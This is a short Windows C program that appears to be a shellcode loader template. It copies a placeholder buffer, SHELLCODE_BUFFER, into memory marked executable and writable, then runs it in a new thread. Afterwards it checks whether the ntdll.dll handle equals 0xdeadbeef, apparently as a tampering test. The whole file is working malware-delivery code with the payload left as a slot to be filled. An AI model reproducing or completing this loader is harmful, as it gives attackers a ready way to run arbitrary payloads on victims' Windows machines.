#include <Windows.h>
#include <stdio.h>

int main(){

    HANDLE hThread = NULL;
    LPVOID addressPointer;

    unsigned char shellcode[] = SHELLCODE_BUFFER;
    printf("Running shellcode\nPress any key to execute payload in a new thread!\n");
    getchar();

    addressPointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);
    RtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
    size_t beef;
    if(hThread != NULL){
        WaitForSingleObject(hThread, -1);
        CloseHandle(hThread);

        char ntdll[] = "ntdll.dll";

        beef = GetModuleHandleA(ntdll);
        if(beef == 0xdeadbeef) printf("We have been beefed! >:(\n");
    }

    return 0;
}